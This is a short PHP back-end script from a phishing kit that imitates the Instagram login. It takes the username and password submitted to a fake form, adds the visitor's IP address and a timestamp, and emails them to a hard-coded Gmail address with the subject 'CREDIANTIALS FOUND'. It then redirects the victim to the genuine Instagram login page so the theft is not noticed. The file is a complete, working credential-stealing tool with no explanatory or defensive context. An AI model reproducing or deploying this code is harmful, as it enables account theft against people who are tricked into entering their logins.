<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "FUCKING-CREDIENTIALS\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "name : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";

$to = "mukeshkotty123@gmail.com";
$subject = "CREDIANTIALS FOUND $ip";
$from = "From: xxxx@yyy.com";
mail($to,$subject,$msg,$from);
header("Location: https://www.instagram.com/accounts/login/");
?>